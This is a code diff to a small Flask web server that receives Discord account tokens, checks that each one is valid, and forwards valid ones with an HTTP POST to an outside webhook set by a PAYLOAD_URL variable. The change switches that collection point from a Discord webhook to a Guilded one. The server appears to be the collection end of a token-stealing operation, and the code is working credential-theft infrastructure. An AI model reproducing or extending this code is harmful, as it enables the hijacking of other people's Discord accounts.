@@ -1,4 +1,3 @@
-from dhooks import Webhook
 import os
 from flask import Flask, redirect
 import requests
@@ -17,13 +16,20 @@ def check_discord_token(token):
     else:
         return "False"
 
-e = os.getenv('DISCORD_URL')
+guilded_webhook_url = os.getenv('PAYLOAD_URL')
 app = Flask(__name__)
-hook = Webhook(e)
+
 @app.route('/token/<string:token>')
 def index(token):
-  if check_discord_token(token) == "True":
-      hook.send(token)
+    if check_discord_token(token) == "True":
+        data = {
+            "content": f"Token: {token}"
+        }
+        response = requests.post(guilded_webhook_url, json=data)
+        if response.status_code == 200:
+            return 'Token sent to Guilded.', 200
+        else:
+            return f'Failed to send token to Guilded: {response.status_code}', 500
 
 @app.route('/update')
 def update():
@@ -38,4 +44,4 @@ def update():
         return f'Failed to download the update: {e}', 500
 
 if __name__ == "__main__":
-  app.run(host='0.0.0.0', port=81)
+    app.run(host='0.0.0.0', port=81)
